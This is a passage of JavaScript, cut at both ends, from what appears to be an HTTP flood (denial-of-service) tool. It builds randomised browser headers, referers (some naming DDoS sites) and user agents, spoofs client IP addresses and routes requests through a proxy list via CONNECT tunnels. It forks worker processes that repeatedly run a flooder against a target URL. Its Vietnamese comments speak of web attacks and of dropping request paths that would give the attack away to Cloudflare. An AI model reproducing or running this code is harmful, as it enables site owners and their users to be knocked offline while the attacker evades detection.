    'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7',
    'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',
    'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
    'no-NO,no;q=0.9,en-US;q=0.8,en;q=0.7',
    'cs-CZ,cs;q=0.9,en-US;q=0.8,en;q=0.7',
    'hu-HU,hu;q=0.9,en-US;q=0.8,en;q=0.7',
    'el-GR,el;q=0.9,en-US;q=0.8,en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'sk-SK,sk;q=0.9,en-US;q=0.8,en;q=0.7',
    'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
    'bg-BG,bg;q=0.9,en-US;q=0.8,en;q=0.7',
    'ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
    'sr-SP,sr;q=0.9,en-US;q=0.8,en;q=0.7',
    'hr-HR,hr;q=0.9,en-US;q=0.8,en;q=0.7',
    'sl-SI,sl;q=0.9,en-US;q=0.8,en;q=0.7',
    'et-EE,et;q=0.9,en-US;q=0.8,en;q=0.7',
    'lt-LT,lt;q=0.9,en-US;q=0.8,en;q=0.7',
    'lv-LV,lv;q=0.9,en-US;q=0.8,en;q=0.7',
    'is-IS,is;q=0.9,en-US;q=0.8,en;q=0.7',
    'ga-IE,ga;q=0.9,en-US;q=0.8,en;q=0.7',
    'mt-MT,mt;q=0.9,en-US;q=0.8,en;q=0.7',
    'mk-MK,mk;q=0.9,en-US;q=0.8,en;q=0.7',
    'sq-AL,sq;q=0.9,en-US;q=0.8,en;q=0.7',
    'bs-BA,bs;q=0.9,en-US;q=0.8,en;q=0.7',
    'hy-AM,hy;q=0.9,en-US;q=0.8,en;q=0.7',
    'ka-GE,ka;q=0.9,en-US;q=0.8,en;q=0.7',
    'az-AZ,az;q=0.9,en-US;q=0.8,en;q=0.7',
    'kk-KZ,kk;q=0.9,en-US;q=0.8,en;q=0.7',
    'ky-KG,ky;q=0.9,en-US;q=0.8,en;q=0.7',
    'uz-UZ,uz;q=0.9,en-US;q=0.8,en;q=0.7',
    'tg-TJ,tg;q=0.9,en-US;q=0.8,en;q=0.7',
    'mn-MN,mn;q=0.9,en-US;q=0.8,en;q=0.7',
    'km-KH,km;q=0.9,en-US;q=0.8,en;q=0.7',
    'lo-LA,lo;q=0.9,en-US;q=0.8,en;q=0.7',
    'my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7',
    'ne-NP,ne;q=0.9,en-US;q=0.8,en;q=0.7',
    'si-LK,si;q=0.9,en-US;q=0.8,en;q=0.7',
    'ur-PK,ur;q=0.9,en-US;q=0.8,en;q=0.7',
    'bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7',
    'pa-IN,pa;q=0.9,en-US;q=0.8,en;q=0.7',
    'gu-IN,gu;q=0.9,en-US;q=0.8,en;q=0.7',
    'or-IN,or;q=0.9,en-US;q=0.8,en;q=0.7',
    'ta-IN,ta;q=0.9,en-US;q=0.8,en;q=0.7',
    'te-IN,te;q=0.9,en-US;q=0.8,en;q=0.7',
    'kn-IN,kn;q=0.9,en-US;q=0.8,en;q=0.7',
    'ml-IN,ml;q=0.9,en-US;q=0.8,en;q=0.7',
    'as-IN,as;q=0.9,en-US;q=0.8,en;q=0.7',
    'mr-IN,mr;q=0.9,en-US;q=0.8,en;q=0.7',
    'sa-IN,sa;q=0.9,en-US;q=0.8,en;q=0.7',
    'sd-IN,sd;q=0.9,en-US;q=0.8,en;q=0.7',
    'bo-CN,bo;q=0.9,en-US;q=0.8,en;q=0.7',
    'ug-CN,ug;q=0.9,en-US;q=0.8,en;q=0.7',
    'dz-BT,dz;q=0.9,en-US;q=0.8,en;q=0.7',
    'ti-ET,ti;q=0.9,en-US;q=0.8,en;q=0.7',
    'am-ET,am;q=0.9,en-US;q=0.8,en;q=0.7',
    'so-SO,so;q=0.9,en-US;q=0.8,en;q=0.7',
    'sw-KE,sw;q=0.9,en-US;q=0.8,en;q=0.7',
    'ha-NG,ha;q=0.9,en-US;q=0.8,en;q=0.7',
    'yo-NG,yo;q=0.9,en-US;q=0.8,en;q=0.7',
    'ig-NG,ig;q=0.9,en-US;q=0.8,en;q=0.7',
    'ff-SN,ff;q=0.9,en-US;q=0.8,en;q=0.7',
    'ln-CD,ln;q=0.9,en-US;q=0.8,en;q=0.7',
    'rw-RW,rw;q=0.9,en-US;q=0.8,en;q=0.7',
    'sg-CF,sg;q=0.9,en-US;q=0.8,en;q=0.7',
    'sn-ZW,sn;q=0.9,en-US;q=0.8,en;q=0.7',
    'zu-ZA,zu;q=0.9,en-US;q=0.8,en;q=0.7',
    'xh-ZA,xh;q=0.9,en-US;q=0.8,en;q=0.7',
    'af-ZA,af;q=0.9,en-US;q=0.8,en;q=0.7',
    'st-LS,st;q=0.9,en-US;q=0.8,en;q=0.7',
    'tn-BW,tn;q=0.9,en-US;q=0.8,en;q=0.7',
    'ts-ZA,ts;q=0.9,en-US;q=0.8,en;q=0.7',
    've-ZA,ve;q=0.9,en-US;q=0.8,en;q=0.7',
    'ss-SZ,ss;q=0.9,en-US;q=0.8,en;q=0.7',
    'nr-ZA,nr;q=0.9,en-US;q=0.8,en;q=0.7',
    'nd-ZW,nd;q=0.9,en-US;q=0.8,en;q=0.7',
    'ny-MW,ny;q=0.9,en-US;q=0.8,en;q=0.7',
    'mg-MG,mg;q=0.9,en-US;q=0.8,en;q=0.7',
    'lo-LA,lo;q=0.9,en-US;q=0.8,en;q=0.7',
    'km-KH,km;q=0.9,en-US;q=0.8,en;q=0.7',
    'my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7',
    'ne-NP,ne;q=0.9,en-US;q=0.8,en;q=0.7',
    'si-LK,si;q=0.9,en-US;q=0.8,en;q=0.7',
    'ur-PK,ur;q=0.9,en-US;q=0.8,en;q=0.7',
    'bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7',
    'pa-IN,pa;q=0.9,en-US;q=0.8,en;q=0.7',
    'gu-IN,gu;q=0.9,en-US;q=0.8,en;q=0.7',
    'or-IN,or;q=0.9,en-US;q=0.8,en;q=0.7',
    'ta-IN,ta;q=0.9,en-US;q=0.8,en;q=0.7',
    'te-IN,te;q=0.9,en-US;q=0.8,en;q=0.7',
    'kn-IN,kn;q=0.9,en-US;q=0.8,en;q=0.7',
    'ml-IN,ml;q=0.9,en-US;q=0.8,en;q=0.7',
    'as-IN,as;q=0.9,en-US;q=0.8,en;q=0.7',
    'mr-IN,mr;q=0.9,en-US;q=0.8,en;q=0.7',
    'sa-IN,sa;q=0.9,en-US;q=0.8,en;q=0.7',
    'sd-IN,sd;q=0.9,en-US;q=0.8,en;q=0.7',
    'bo-CN,bo;q=0.9,en-US;q=0.8,en;q=0.7',
    'ug-CN,ug;q=0.9,en-US;q=0.8,en;q=0.7',
    'dz-BT,dz;q=0.9,en-US;q=0.8,en;q=0.7',
    'ti-ET,ti;q=0.9,en-US;q=0.8,en;q=0.7',
    'am-ET,am;q=0.9,en-US;q=0.8,en;q=0.7',
    'so-SO,so;q=0.9,en-US;q=0.8,en;q=0.7',
    'sw-KE,sw;q=0.9,en-US;q=0.8,en;q=0.7',
    'ha-NG,ha;q=0.9,en-US;q=0.8,en;q=0.7',
    'yo-NG,yo;q=0.9,en-US;q=0.8,en;q=0.7',
    'ig-NG,ig;q=0.9,en-US;q=0.8,en;q=0.7',
    'ff-SN,ff;q=0.9,en-US;q=0.8,en;q=0.7',
    'ln-CD,ln;q=0.9,en-US;q=0.8,en;q=0.7',
    'rw-RW,rw;q=0.9,en-US;q=0.8,en;q=0.7',
    'sg-CF,sg;q=0.9,en-US;q=0.8,en;q=0.7',
    'sn-ZW,sn;q=0.9,en-US;q=0.8,en;q=0.7',
    'zu-ZA,zu;q=0.9,en-US;q=0.8,en;q=0.7',
    'xh-ZA,xh;q=0.9,en-US;q=0.8,en;q=0.7',
    'af-ZA,af;q=0.9,en-US;q=0.8,en;q=0.7',
    'st-LS,st;q=0.9,en-US;q=0.8,en;q=0.7',
    'tn-BW,tn;q=0.9,en-US;q=0.8,en;q=0.7',
    'ts-ZA,ts;q=0.9,en-US;q=0.8,en;q=0.7',
    've-ZA,ve;q=0.9,en-US;q=0.8,en;q=0.7',
    'ss-SZ,ss;q=0.9,en-US;q=0.8,en;q=0.7',
    'nr-ZA,nr;q=0.9,en-US;q=0.8,en;q=0.7',
    'nd-ZW,nd;q=0.9,en-US;q=0.8,en;q=0.7',
    'ny-MW,ny;q=0.9,en-US;q=0.8,en;q=0.7',
    'mg-MG,mg;q=0.9,en-US;q=0.8,en;q=0.7',
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    'gzip',
    'deflate',
    'identity',
    '*'
];

const controle_header = [
    'no-cache',
    'no-store',
    'max-age=0',
    'must-revalidate',
    'public',
    'private',
    'proxy-revalidate',
    's-maxage=86400',
    'max-age=604800',
    'max-age=315360000',
    'public, max-age=0',
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800',
    'max-stale',
    'public, immutable, max-age=31536000',
    'max-age=31536000,public,immutable',
    'max-age=31536000,public',
    'min-fresh',
    'no-cache, no-transform',
    'max-age=2592000',
    'no-store',
    'no-transform',
    'max-age=31557600',
    'stale-if-error',
    'only-if-cached',
    'must-understand, no-store',
    'max-age=31536000; includeSubDomains',
    'max-age=31536000; includeSubDomains; preload',
    'max-age=120',
    'max-age=0,no-cache,no-store,must-revalidate',
    'public, max-age=604800, immutable',
    'max-age=0, must-revalidate, private',
    'max-age=0, private, must-revalidate',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'public, max-age=2678400',
    'min-fresh=600',
    'public, max-age=30672000',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
    'public, s-maxage=600, max-age=60',
    'public, max-age=31536000',
    'max-age=14400, public',
    'max-age=14400',
    'max-age=600, private',
    'public, s-maxage=600, max-age=60',
    'no-store, no-cache, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
];

const Methods = [
    "GET",
    "POST",
    "HEAD",
    // "PUT", // Ít dùng trong tấn công web thông thường
    // "DELETE", // Ít dùng trong tấn công web thông thường
    // "CONNECT", // Dùng cho proxy, không phải yêu cầu thông thường
    // "OPTIONS", // Ít dùng trong tấn công web thông thường
    // "TRACE", // Ít dùng trong tấn công web thông thường
    // "PATCH", // Ít dùng trong tấn công web thông thường
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = [
    "&", 
    "=", 
];

const pathts = [
    "/",
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
    // Xóa các path liên quan đến Cloudflare challenge vì chúng là dấu hiệu rõ ràng của tấn công
    // "?__cf_chl_rt_tk=...",
    // "?__cf_clearance=...",
];

const refers = [
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.wikipedia.org/",
    "https://www.reddit.com/",
    "https://www.amazon.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.pinterest.com/",
    "https://www.stackoverflow.com/",
    "https://github.com/",
    "https://medium.com/",
    "https://www.nytimes.com/",
    "https://www.bbc.com/",
    "https://www.cnn.com/",
    "https://www.theguardian.com/",
    "https://www.bloomberg.com/",
    "https://www.reuters.com/",
    "https://www.wsj.com/",
    "https://www.techcrunch.com/",
    "https://www.theverge.com/",
    "https://www.engadget.com/",
    "https://www.cnet.com/",
    "https://www.wired.com/",
    "https://www.mozilla.org/",
    "https://www.apple.com/",
    "https://www.microsoft.com/",
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.fbi.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords=",
    "http://host-tracker.com/check_page/?furl=",
    "http://itch.io/search?q=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://jobs.bloomberg.com/search?q=",
    "http://jobs.leidos.com/search?q=",
    "http://jobs.rbs.com/jobs/search?q=",
    "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
    "http://louis-ddosvn.rhcloud.com/f5.html?v=",
    "http://millercenter.org/search?q=",
    "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
    "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
    "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
    "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
    "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
    "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
    "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
    "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
    "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
    "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
    "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
    "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
    "http://search.aol.com/aol/search?q=",
    "http://taginfo.openstreetmap.org/search?q=",
    "http://techtv.mit.edu/search?q=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://vk.com/profile.php?redirect=",
    "http://www.ask.com/web?q=",
    "http://www.baoxaydung.com.vn/news/vn/search&q=",
    "http://www.bestbuytheater.com/events/search?q=",
    "http://www.bing.com/search?q=",
    "http://www.evidence.nhs.uk/search?q=",
    "http://www.google.com/?q=",
    "http://www.google.com/translate?u=",
    "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
    "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.pagescoring.com/website-speed-test/?url=",
    "http://www.reddit.com/search?q=",
    "http://www.search.com/search?q=",
    "http://www.shodanhq.com/search?q=",
    "http://www.ted.com/search?q=",
    "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://www.ustream.tv/search?q=",
    "http://yandex.ru/yandsearch?text=",
    "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
    "http://ytmnd.com/search?q=",
    "https://add.my.yahoo.com/rss?url=",
    "https://careers.carolinashealthcare.org/search?q=",
    "https://developers.google.com/speed/pagespeed/insights/?url=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://play.google.com/store/search?q=",
    "https://pornhub.com/",
    "https://r.search.yahoo.com/",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://steamcommunity.com/market/search?q=",
    "https://vk.com/profile.php?redirect=",
    "https://www.bing.com/search?q=",
    "https://www.cia.gov/index.html",
    "https://www.facebook.com/",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://www.fbi.com/",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.co.ao/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.com/search?q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
    "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
    "https://www.npmjs.com/search?q=",
    "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
    "https://www.pinterest.com/search/?q=",
    "https://www.qwant.com/search?q=",
    "https://www.ted.com/search?q=",
    "https://www.usatoday.com/search/results?q=",
    "https://www.yandex.com/yandsearch?text=",
    "https://www.youtube.com/",
    "https://yandex.ru/",
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
];

const ip_spoof = () => {
    const ip_segment = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000); // Giảm timeout để tránh treo
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
